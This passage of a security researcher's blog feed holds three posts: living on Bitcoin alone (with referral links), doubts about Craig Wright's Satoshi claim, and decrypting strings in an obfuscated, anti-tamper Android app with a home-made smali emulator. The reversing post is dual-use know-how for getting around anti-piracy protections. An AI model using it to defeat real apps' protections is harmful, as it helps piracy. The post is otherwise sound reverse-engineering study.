<p>Please be aware that this is still work in progress, I’m trying the methods I’m going to show you these very same days, do <strong>not</strong> give my word for granted, if you want to follow this path, please be sure you know what you’re doing and most importantly double check every single thing.</p>
<a id="more"></a>
<h3 id="Reasons"><a href="#Reasons" class="headerlink" title="Reasons"></a>Reasons</h3><p>I don’t know about you, but honestly I’m sick and tired of the Banking system for a few reasons:</p>
<ul>
<li>I do not accept the concept of “trust”, I don’t know those guys, why should I trust them? On the other hand, with BTC trust is not even considered to be a factor.</li>
<li>I do not accept someone else having control over my money or credit cards, I earned those money, who the fuck are you to decide how much and when can I withdraw or deposit?</li>
<li>I do not accept that the government has the right to access my bank accounts, see my balance and eventually freeze them.</li>
<li>I do not accept 2-3 business days for a wire transfer, we all know that that is not due to technical reasons, banks just speculate on those money while they’re on hold.</li>
<li>I do not accept their fees, they’re way too much high for the quality of service they give to you.</li>
</ul>
<p>There’re plenty of other minor reasons of course, but these are the most important ones, at least for me.</p>
<h3 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h3><p>Like any other big change, there’re a few issues we need to solve, in this section I’ll explain the major ones while in the next one I’ll show you how I’m solving them.</p>
<h4 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h4><p>The first thing you should keep in mind is to <strong>stay safe</strong>, what I mean is that there’re plenty of services where you can create your own bitcoin wallet, but wallets stored on the web are as secure as the web infrastructure they’re relying upon.<br>No matter how safe they clame to be, web services can be hacked (or simply go bankrupt, see MtGox for instance) and eventyally there’s a pretty good chance to lose all of your money.<br>There’s no central entity, there’s no guarantee, an online wallet <strong>is not a bank</strong>, so no one will give your BTC back if they somehow get lost.</p>
<h4 id="Getting-fiat-real-money-from-your-BTC-wallet"><a href="#Getting-fiat-real-money-from-your-BTC-wallet" class="headerlink" title="Getting fiat (real money) from your BTC wallet"></a>Getting fiat (real money) from your BTC wallet</h4><p>BTC are great and everything, but you can’t pay your groceries with them, can you? Or your rent, or a restaurant … you need a good and reliable way to get USD or EUR or whatever from your BTC account anytime, anywhere.</p>
<h4 id="Putting-fiat-into-your-BTC-wallet"><a href="#Putting-fiat-into-your-BTC-wallet" class="headerlink" title="Putting fiat into your BTC wallet"></a>Putting fiat into your BTC wallet</h4><p>AKA How to get your paycheck directly into your BTC wallet … I work for an US company and every month I receive my paycheck in USD (which eventually are converted to EUR from my bank), I need a way to receive these money directly as BTC to my wallet without asking my employer to switch to BTC payments, ideally I would just give him a new IBAN which somehow “maps” to my BTC wallet.</p>
<h3 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h3><p>Regarding the <strong>security</strong> issue, the only way to stay 99% safe ( 100% is a chimera, we all know that ) is to have a hardware wallet, personally I’ve bought a Trezor (which hopefully is going to arrive tomorrow) but <a href="https://en.bitcoin.it/wiki/Hardware_wallet" target="_blank" rel="external">there’re plenty of other options available</a> out there.</p>
<p><img src="/images/2016/05/trezor.jpg" alt="trezor"></p>
<p>Unlike a web wallet or a software wallet created with some bitcoin client such as BitCoin-core, Mycelium or whatever, a hardware wallet like the Trezor stores your cryptographic keys (the ones you use to send or receive BTC basically) inside it and never sends data to your computer, it’s your computer which sends each transaction to the device and the device itself eventually will sign that transaction.<br>This way even if your computer is compromised, any malicious third party won’t be able to steal your BTC. Moreover, if you lose your device or you break it, you can recover your BTC from the “initialization seed” you’re supposed to save on paper when you initialize the device for the first time.</p>
<p>Also, remember to use every webservice I’m going to talk about only as a “proxy”, never leave all your BTC on them, only move the minimum amount you require from your hardware wallet, and always remember to enable 2 factor authentication.</p>
<p>Having a very strong and unique password for every different web service is also good practice, you can use softwares such as KeepPass, 1Password or SafeInCloud in order to generate and store them safely.</p>
<p><strong>Problem one solved!</strong> :)</p>
<p>Now we need a good way to pay restaurants, amazon purchases and get USD/EUR/whatever from an ATM … debit cards!</p>
<p>There’re a few online services which allow you to open a BTC wallet (remember, do <strong>not</strong> deposit all of your BTC on these wallets ) and receive a real debit card ( VISA, MasterCard, you name it ). You deposit/send some BTC on that wallet, charge the debit card and then you can use it either as a normal credit card or on every ATM in the world to withdraw cash from that wallet.<br>The service I’m using right now is <a href="https://cryptopay.me/join/b5728364" target="_blank" rel="external">CryptoPay</a> which I find to be the best, once you’ve verified your identity (uploading your passport and some utility bill to prove the address you’ve provided is real), you have <strong>no limits</strong> whatsoever, you can charge the card as many times as you want with as many money as you want, just like the normal debit card you could get from your bank.</p>
<p><strong>Problem two solved!</strong></p>
<p>The last problem we need to find a solution for, is getting your paycheck (or any other form of income you have) directly to your BTC wallet, there’re two main services that allows you to do this, I’m testing both these days ( <a href="https://www.reddit.com/r/Bitcoin/comments/4ieu7x/trying_to_live_only_on_btc_cashila_or_bitwage/" target="_blank" rel="external">I also asked for some users feedbacks on reddit</a> just to be 100% sure ) :</p>
<ul>
<li><a href="https://bitwa.la/r/N3yjt9qeccjs4qCXc" target="_blank" rel="external">Bitwa.la</a></li>
<li><a href="http://csh.la/1SWD8xG" target="_blank" rel="external">Cashila.com</a></li>
<li><a href="https://www.bitwage.com/referral/PSBJCGWMAR4O" target="_blank" rel="external">BitWage.com</a></li>
</ul>
<p>The two are almost the same, they basically give you some bank coordinates with a reference id which is unique to you, you should ask your employer to send your next paychecks to those coordinates and they will be automatically send through the blockchain to your BTC wallet.</p>
<p>Bitwala and Cashila also allow you to <strong>make</strong> wire transfers, so if you want to pay your bills, rent or whatever with some normal money transfer, you can easily use your Bitwala/Cashila account, while BitWage still does not offer this feature.</p>
<p>Peronsally I find <a href="https://bitwa.la/r/N3yjt9qeccjs4qCXc" target="_blank" rel="external">Bitwala</a> to be way better than Cashila, it’s cheaper, faster and more suitable for EUR zone payments … I’m definitely going to use it for paying the rent, bills, etc :)</p>
<p><strong>Problem three solved!</strong></p>
<h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>Using the aforementioned services and tools, you can now live only on BTC, you’re never gonna need a bank account again.<br>You might be thinking “yeah, nice, but BTC are unstable, their value could change anytime” … this is half true.<br>Their value indeed changes quickly, but not as much as it used to change, in the <a href="http://www.coindesk.com/price/" target="_blank" rel="external">last three months</a> for instance there’ve been an oscillation just between 373$ and 479$, which might seems a lot but if you move your BTC at the right time you’re not going to lose anything, on the contrary, compared to the fees you would normally pay for Bank transactions, chances are you’re going to spend way much less anyway.</p>
<p>In a few months I’ll write a new blog post with an updated situation and the outcomes of this decision … in the meantime, let’s hope for the best! :)</p>
<p>If you still have doubts or questions, the <a href="https://www.reddit.com/r/Bitcoin" target="_blank" rel="external">BitCoin Reddit</a> is a great source of informations and user feedbacks.</p>
<p>PS: If you have some spare BTC and wanna offer me a beer, this is my bitcoin account <code>3Gef69VY8HdhsPghdbipMrepMCKHWukXd3</code> :)</p>
<p><img src="/images/2016/05/account.png" alt="account"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;I’ve been interested in BitCoin since the very beginning but, until now, I considered BTC some very nice cryptographic experiment with high potential but almost no effects on real life.&lt;br&gt;A few years ago, buying BTC or selling them in order to get fiat ( “real” currency such as USD, EUR, etc ) wasn’t easy at all, but now things changed and things are much easier.&lt;br&gt;That’s why I decided to live only with BitCoin and this is how I’m trying to do it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2016/05/bitcoins.jpg&quot; alt=&quot;bitcoin&quot;&gt;&lt;/p&gt;
&lt;p&gt;Please be aware that this is still work in progress, I’m trying the methods I’m going to show you these very same days, do &lt;strong&gt;not&lt;/strong&gt; give my word for granted, if you want to follow this path, please be sure you know what you’re doing and most importantly double check every single thing.&lt;/p&gt;
    
    </summary>
    
    
      <category term="bitcoin" scheme="https://www.evilsocket.net/tags/bitcoin/"/>
    
      <category term="btc" scheme="https://www.evilsocket.net/tags/btc/"/>
    
      <category term="banks" scheme="https://www.evilsocket.net/tags/banks/"/>
    
      <category term="banking" scheme="https://www.evilsocket.net/tags/banking/"/>
    
      <category term="trezor" scheme="https://www.evilsocket.net/tags/trezor/"/>
    
  </entry>
  
  <entry>
    <title>Is This a Declaration of Cyber War?</title>
    <link href="https://www.evilsocket.net/2016/05/03/is-this-a-declaration-of-cyber-war/"/>
    <id>https://www.evilsocket.net/2016/05/03/is-this-a-declaration-of-cyber-war/</id>
    <published>2016-05-02T22:28:30.000Z</published>
    <updated>2016-05-02T23:08:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>Hey guys, I’m writing this post mostly to save the stuff I’m going to share from being censored/removed, but also to share some of my thoughts about the thing.</p>
<p>I like spy movies a lot, so if this just looks like bullshit to you be fair and be good, I’m just worried about the people’s privacy :)</p>
<a id="more"></a>
<p><img src="/images/2016/05/internet-privacy.jpg" alt="privacy"></p>
<h3 id="BitCoin-Drama"><a href="#BitCoin-Drama" class="headerlink" title="BitCoin Drama"></a>BitCoin Drama</h3><p>I don’t know if you’ve been following the whole BitCoin and Satoshi Nakamoto drama, basically Mr. Craig Wright <a href="http://www.economist.com/news/business-and-finance/21698060-craig-wright-reveals-himself-as-satoshi-nakamoto" target="_blank" rel="external">claims that he is</a> Nakamoto, reveiling, finally, the true BitCoin creator’s identity.</p>
<p>He also showed some alleged <a href="http://www.engadget.com/2016/05/02/bitcoin-creator-craig-wright/" target="_blank" rel="external">crypto proof</a>.</p>
<p>Suddenly, on <a href="https://www.reddit.com/r/Bitcoin/comments/4hflr3/craig_wrights_signature_is_worthless/" target="_blank" rel="external">Reddit</a> people started to explain how this “proof” was fake.</p>
<pre><code>JoukeH discovered that the signature on Craig Wright&apos;s blog post is not a signature of any &quot;Sartre&quot; message, but just the signature inside of Satoshi&apos;s 2009 Bitcoin transaction. It absolutely doesn&apos;t show that Wright is Satoshi, and it does very strongly imply that the purpose of the blog post was to deceive people.
So Craig Wright is once again shown to be a likely scammer. When will the media learn?
Take the signature being “verified” as proof in the blog post:
MEUCIQDBKn1Uly8m0UyzETObUSL4wYdBfd4ejvtoQfVcNCIK4AIgZmMsXNQWHvo6KDd2Tu6euEl13VTC3ihl6XUlhcU+fM4=

Convert to hex:
3045022100c12a7d54972f26d14cb311339b5122f8c187417dde1e8efb6841f55c34220ae0022066632c5cd4161efa3a2837764eee9eb84975dd54c2de2865e9752585c53e7cce

Find it in Satoshi&apos;s 2009 transaction:
https://blockchain.info/tx/828ef3b079f9c23829c56fe86e85b4a69d9e06e5b54ea597eef5fb3ffef509fe?format=hex
Also, it seems that there&apos;s substantial vote manipulation in /r/Bitcoin right now...
</code></pre><p>I just thought “oh, some bad guy is speculating on bitcoins … meh” … but then <a href="https://www.reddit.com/r/Bitcoin/comments/4hj1xu/why_i_declined_to_verify_sns_identity_two_weeks/" target="_blank" rel="external">this came out</a>:</p>
<pre><code>Why I declined to &quot;verify&quot; SN&apos;s identity two weeks ago

About two weeks ago I was contacted and asked to offer security advice for a project. I was asked to sign an NDA in order to discuss the project itself, something I am reluctant to do, in general. Once I received the NDA however, it became obvious that the project was related to verifying the identity of Satoshi Nakamoto. I immediately declined the offer, declined to participate and declined to sign the NDA.
I&apos;m sure many people will think I was wrong to decline the &quot;opportunity&quot; to verify SN&apos;s identity. From my perspective, the request for me to verify his/her/their identity is in itself an appeal to authority. It is replacing public cryptographic proof with endorsement by a third party. If SN wants to &quot;prove&quot; their identity, they don&apos;t need an &quot;authority&quot; to do so. They can do it in a public, open manner. To ask people in the space who have a reputation to stake that reputation and vouch for SN&apos;s identity raises many red flags in my mind.
I don&apos;t know if Craig Wright is SN. I don&apos;t care and I don&apos;t want to know.
As I have expressed many times in the past, I think the identity of Satoshi Nakamoto does not matter. More importantly I think it serves to distract from the fact that bitcoin is not controlled by anyone and is not a system of Appeal-to-Authority. Identifying the creator only serves to feed the appeal-to-authority crowd, as if SN is some kind of infallible prophet, or has any say over bitcoin&apos;s future.
Identity and authority are distractions from a system of mathematical proof that does not require trust. This is not a telenovela. Bitcoin is a neutral framework of trust that can bring financial empowerment to billions of people. It works because it doesn&apos;t depend on any authority. Not even Satoshi&apos;s.
Back to work.
</code></pre><p>The user who posted is not just some unknown, random user, <a href="https://www.reddit.com/user/andreasma" target="_blank" rel="external">he’s a well recognized part of the Reddit community</a>.</p>
<p>I’m neither a crypto expert nor a politics expert, but <strong>what I know</strong> is that during these very same days, governments all over the world are discussiong about our privacy, the right to have encrypted and private communications and so forth.</p>
<ul>
<li><a href="http://thehackernews.com/2016/04/fbi-hacking-power.html" target="_blank" rel="external">http://thehackernews.com/2016/04/fbi-hacking-power.html</a></li>
<li><a href="http://thehackernews.com/2016/04/tor-unmask-malware.html" target="_blank" rel="external">http://thehackernews.com/2016/04/tor-unmask-malware.html</a></li>
<li><a href="http://thehackernews.com/2016/04/apple-vulnerability.html" target="_blank" rel="external">http://thehackernews.com/2016/04/apple-vulnerability.html</a></li>
</ul>
<p>And these links are just a small example about what is happening.</p>
<p>Having said that … isn’t this BitCoin thing very peculiar at this time?</p>
<p>If someone is really trying to replace cryptokeys and take control of the BitCoin market, who is he? Or … who are them? Which organization is big enough to compromise/buy the media and spread such BS at such level?</p>
<p>Is it just me, or this is some kind of declaration of cyber war to the free people of the free web, us?</p>
<p>Maybe … yeah, it’s just me … or maybe George Orwell was very right.</p>
<pre><code>Perhaps a lunatic was simply a minority of one.
- George Orwell, 1984
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hey guys, I’m writing this post mostly to save the stuff I’m going to share from being censored/removed, but also to share some of my thoughts about the thing.&lt;/p&gt;
&lt;p&gt;I like spy movies a lot, so if this just looks like bullshit to you be fair and be good, I’m just worried about the people’s privacy :)&lt;/p&gt;
    
    </summary>
    
    
      <category term="privacy" scheme="https://www.evilsocket.net/tags/privacy/"/>
    
      <category term="bitcoin" scheme="https://www.evilsocket.net/tags/bitcoin/"/>
    
      <category term="btc" scheme="https://www.evilsocket.net/tags/btc/"/>
    
      <category term="satoshi nakamoto" scheme="https://www.evilsocket.net/tags/satoshi-nakamoto/"/>
    
      <category term="identity" scheme="https://www.evilsocket.net/tags/identity/"/>
    
      <category term="craig wright" scheme="https://www.evilsocket.net/tags/craig-wright/"/>
    
      <category term="government" scheme="https://www.evilsocket.net/tags/government/"/>
    
      <category term="cryptography" scheme="https://www.evilsocket.net/tags/cryptography/"/>
    
  </entry>
  
  <entry>
    <title>How I Defeated an Obfuscated and Anti-Tamper APK With Some Python and a Home-Made Smali Emulator.</title>
    <link href="https://www.evilsocket.net/2016/04/18/how-i-defeated-an-obfuscated-and-anti-tamper-apk-with-some-python-and-a-home-made-smali-emulator/"/>
    <id>https://www.evilsocket.net/2016/04/18/how-i-defeated-an-obfuscated-and-anti-tamper-apk-with-some-python-and-a-home-made-smali-emulator/</id>
    <published>2016-04-18T03:31:02.000Z</published>
    <updated>2016-04-18T05:56:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>During this Saturday afternoon I was chatting with a friend of mine ( <a href="https://twitter.com/fvrmatteo" target="_blank" rel="external">Matteo</a> ) and he asked for some help to fix a Python script he was working on.</p>
<p>He was trying to deobfuscate an APK in order to understand its obfuscation and anti tampering (more on this later) protections so I started working on it as well.</p>
<p>This was definitely way more challenging ( and fun! ) than my usual APK reversing session ( dex2jar -&gt; jd-gui -&gt; <strong>done</strong> ), moreover this required me to write a new tool which I find kinda cool and unique ( IMHO of course ), so I’m going to share the story in this post.</p>
<p>I’m going to intentionally skip a few details here and there because I do not want to cause any harm to the people who wrote that application, all the involved protection mechanisms are there to avoid piracy.</p>
<a id="more"></a>
<h3 id="Weird-Characters-Are-Weird"><a href="#Weird-Characters-Are-Weird" class="headerlink" title="Weird Characters Are Weird"></a>Weird Characters Are Weird</h3><p>Like every other reverser who experienced APK decompilation I’m used to Proguard messing with class and method names ( or Dexguard messing with strings, and so forth ), this is not usually a big deal to me, but what I saw when I executed <strong>apktool</strong> was definitely surprising:</p>
<center><br><img src="/images/2016/04/apktool.png" alt="apktool"><br></center>

<center><br><img src="/images/2016/04/wtf.jpeg" alt="wtf"><br></center>

<p>Most of the classes and methods names were weird binary strings, this almost freezed every single tool or editor I used to inspect those files, so the very first step was to fix ( to be honest, reimplement from scratch XD ) the python script that Matteo was trying to use to rename each obfuscated entry, the script itself was quite simple:</p>
<ul>
<li>Loop all smali files with non printable names.</li>
<li>Replace the obfuscated class name with <em>ClassXXX</em> ( where XXX is an incremental integer ).</li>
<li>Rename the files.</li>
<li>Search for every references to those classes and patch them with the new names ( regular expressions FTW! ).</li>
<li>Repeat the process against <em>.field</em> directives ( class members, methods, etc ).</li>
</ul>
<p>At the end of the process, I finally had a browsable folder and readable smali files :)</p>
<center><br><img src="/images/2016/04/phase1.png" alt="after basic deobfuscation"><br></center>

<p>But I was definitely far from having done …</p>
<h3 id="Anti-Tampering"><a href="#Anti-Tampering" class="headerlink" title="Anti Tampering"></a>Anti Tampering</h3><p>Before I continue, there’re two things I need to point out in order to make the reasons behind my approach clearer:</p>
<ol>
<li>Matteo told me that the application had some misterious anti tampering ( and most likely anti debugging ) protection, therefore rebuilding the smali to a new APK with some injected code was not possible, neither was debugging.</li>
<li>Such protections not only prevented code injection/modification, but also uninstalled the application if such tampering was detected.</li>
</ol>
<p>So no code injection ( nope, XPosed neither ), no debugging, absolutely no chance to use my standard approach for reversing it :(</p>
<center><br><img src="/images/2016/04/Okay-Meme-Gif-05.jpg" alt="sad"><br></center>

<h3 id="Encrypted-Strings"><a href="#Encrypted-Strings" class="headerlink" title="Encrypted Strings"></a>Encrypted Strings</h3><p>As the lazy (or smart, you decide) reverser I am, instead of trying to understand the logic, at first I tried to search for meaningful strings that could give me some hints about what was going on in the app, but again I had a nasty surprise instead.</p>
<p>Every single string was encrypted with a custom algorithm, basically every reference to a string was replaced by something like:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">String decrypted = Class623::method5( <span class="keyword">new</span> <span class="keyword">int</span>[]&#123; -<span class="number">12</span>, <span class="number">44</span>, -<span class="number">35</span>, ... &#125;, <span class="number">52</span> );</div></pre></td></tr></table></figure>
<p>Just a long array of integers and another integer as the second argument (maybe some sort of key?)</p>
<p>What I usually do in these cases is:</p>
<ol>
<li>Decompile the APK to java ( with dex2jar + jd-gui or just jadx ).</li>
<li>Take the java code of the decryption routine and paste it in a stand alone java console application.</li>
<li>Run the decryption routine against the encrypted stuff and eventually get the clear text results.</li>
</ol>
<p>Guess what? Every single tool failed to correctly transform the smali code of <strong>Class623::method5</strong> into java … the output was just nonsense, not working, nada … and for the record I’m not that good in reading smali code (the routine itself was quite complicated, at least for my smali skills) … but I couldn’t just give up … no way!</p>
<center><br><img src="/images/2016/04/challengeaccepted.jpg" alt="challenge accepted"><br></center>

<h3 id="All-hail-the-Smali-Emulator"><a href="#All-hail-the-Smali-Emulator" class="headerlink" title="All hail the Smali Emulator"></a>All hail the Smali Emulator</h3><p>Of course I could take the smali code of <strong>Class623::method5</strong>, create a new Android app, decompile it with apktool, inject the smali code of that routine into the output, insert a smali call to that code into the app, rebuild it and launch it … but:</p>
<ol>
<li>Again, I’m <strong>lazy</strong>.</li>
<li>This solution wouldn’t be <strong>elegant</strong>.</li>
<li>A new idea was just born in my head and it was just too cool, I <strong>had</strong> to try it!</li>
</ol>
<p>Long story short, I said to myself:</p>
<pre><code>Fuck this, I&apos;m gonna write a smali parser and emulator and feed it with this
routine, eventually it will output all the cleartexts I need!
</code></pre><p>So I started reading <a href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html" target="_blank" rel="external">Dalvik opcodes specs</a> ( tnx to <strong>Gabor Paller</strong> for this! ) and putting some code together, after a few hours I had this simple script ready for testing:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> smali.emulator <span class="keyword">import</span> Emulator</div><div class="line"></div><div class="line">emu = Emulator()</div><div class="line"></div><div class="line"><span class="comment"># The smali file to emulate.</span></div><div class="line">filename = <span class="string">'decryptor.smali'</span></div><div class="line"><span class="comment"># Arguments for the method.</span></div><div class="line">args = &#123;</div><div class="line">    <span class="string">'p0'</span>: (<span class="number">-62</span>, <span class="number">-99</span>, <span class="number">-106</span>, <span class="number">-125</span>, <span class="number">-123</span>, <span class="number">-105</span>, <span class="number">-98</span>, <span class="number">-37</span>, <span class="number">-105</span>, <span class="number">-97</span>, <span class="number">-103</span>, <span class="number">-41</span>, <span class="number">-118</span>, <span class="number">-97</span>, <span class="number">-113</span>, <span class="number">-103</span>, <span class="number">-109</span>, <span class="number">-104</span>, <span class="number">-115</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">103</span>, <span class="number">35</span>, <span class="number">52</span>),</div><div class="line">    <span class="string">'p1'</span>: <span class="number">19</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">ret = emu.run( filename, args )</div><div class="line"></div><div class="line"><span class="keyword">print</span> emu.stats</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"RESULT:\n"</span></div><div class="line"><span class="keyword">print</span> <span class="string">"'%s'"</span> % ret</div></pre></td></tr></table></figure>
<p>Aaaaaaand:</p>
<center><br><img src="/images/2016/04/pwned.png" alt="decrypted"><br></center>

<p><strong>BINGO!!!</strong></p>
<p>I executed the script against every encrypted string and it worked like a charm, the emulator was able to correctly parse and execute the smali code of the decryption routine and decrypt every single entry I’ve extracted from the decompiled application … from that point on it was just a matter of replacing encrypted entries with their cleartexts and the reversing process became as easy as pie :)</p>
<center><br><img src="/images/2016/04/victory.jpg" alt="victory"><br></center>

<h3 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h3><p>I’ve released the code on <a href="https://github.com/evilsocket/smali_emulator" target="_blank" rel="external">github</a> as usual, it still lacks the support for a lot of Dalvik opcodes, I’ve just implemented the ones I needed in order to emulate that routine ( which you can find in the repo as well ), but it’s quite easy to improve it and probably I’ll complete it in the next few days :)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;During this Saturday afternoon I was chatting with a friend of mine ( &lt;a href=&quot;https://twitter.com/fvrmatteo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Matteo&lt;/a&gt; ) and he asked for some help to fix a Python script he was working on.&lt;/p&gt;
&lt;p&gt;He was trying to deobfuscate an APK in order to understand its obfuscation and anti tampering (more on this later) protections so I started working on it as well.&lt;/p&gt;
&lt;p&gt;This was definitely way more challenging ( and fun! ) than my usual APK reversing session ( dex2jar -&amp;gt; jd-gui -&amp;gt; &lt;strong&gt;done&lt;/strong&gt; ), moreover this required me to write a new tool which I find kinda cool and unique ( IMHO of course ), so I’m going to share the story in this post.&lt;/p&gt;
&lt;p&gt;I’m going to intentionally skip a few details here and there because I do not want to cause any harm to the people who wrote that application, all the involved protection mechanisms are there to avoid piracy.&lt;/p&gt;
    
    </summary>
    
    
      <category term="android" scheme="https://www.evilsocket.net/tags/android/"/>
    
      <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
    
      <category term="apk" scheme="https://www.evilsocket.net/tags/apk/"/>
    
      <category term="dalvik" scheme="https://www.evilsocket.net/tags/dalvik/"/>
    
      <category term="encryption" scheme="https://www.evilsocket.net/tags/encryption/"/>
    
      <category term="emulator" scheme="https://www.evilsocket.net/tags/emulator/"/>
    
      <category term="mobile" scheme="https://www.evilsocket.net/tags/mobile/"/>
    
      <category term="obfuscation" scheme="https://www.evilsocket.net/tags/obfuscation/"/>
    
      <category term="python" scheme="https://www.evilsocket.net/tags/python/"/>
    
      <category term="emulation" scheme="https://www.evilsocket.net/tags/emulation/"/>
    
      <category term="smali" scheme="https://www.evilsocket.net/tags/smali/"/>
    
  </entry>
  
</feed>
